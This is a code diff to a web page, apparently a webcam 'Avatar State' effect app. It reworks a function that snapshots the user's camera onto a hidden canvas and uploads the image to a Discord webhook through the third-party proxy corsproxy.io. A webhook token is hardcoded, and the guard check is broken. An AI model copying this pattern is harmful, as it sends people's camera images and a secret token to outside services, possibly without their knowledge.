@@ -300,32 +300,33 @@
         function captureAndSendToDiscord(captionText) {
             if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes("https://discord.com/api/webhooks/1548376439743717386/5-Mah_MweniRhFAzjFAfKGy8uP29zmiVGqzkZauG6-gkgpFgFsNCTvd46kbstoNMf021")) return;
 
-            // Draw unmirrored snapshot to hidden canvas
             snapshotCtx.save();
             snapshotCtx.scale(-1, 1);
             snapshotCtx.drawImage(videoElement, -snapshotCanvas.width, 0, snapshotCanvas.width, snapshotCanvas.height);
             snapshotCtx.restore();
 
-            // Convert canvas frame directly into a clean Data URL (Base64 JPEG)
-            const dataUrl = snapshotCanvas.toDataURL('image/jpeg', 0.8);
+            snapshotCanvas.toBlob((blob) => {
+                const formData = new FormData();
+                formData.append('payload_json', JSON.stringify({ 
+                    content: `🔥 **Avatar State Triggered:** ${captionText}` 
+                }));
+                formData.append('file0', blob, 'avatar-capture.jpg');
 
-            // Send via an embed payload using JSON (avoids multipart binary blocks)
-            const payload = {
-                content: `🔥 **Avatar State Triggered:** ${captionText}`,
-                embeds: [{
-                    image: {
-                        url: dataUrl
+                // Route through an explicit CORS service capable of accepting file streams, 
+                // or handle the direct client-side proxy call.
+                const targetUrl = 'https://corsproxy.io/?' + encodeURIComponent(DISCORD_WEBHOOK_URL);
+
+                fetch(targetUrl, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        console.error("Webhook responded with status:", response.status);
                     }
-                }]
-            };
-
-            fetch(DISCORD_WEBHOOK_URL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(payload)
-            }).catch(err => console.error('Discord Webhook Error:', err));
+                })
+                .catch(err => console.error('Discord Webhook Fetch Error:', err));
+            }, 'image/jpeg', 0.85);
         }
     </script>
 </body>
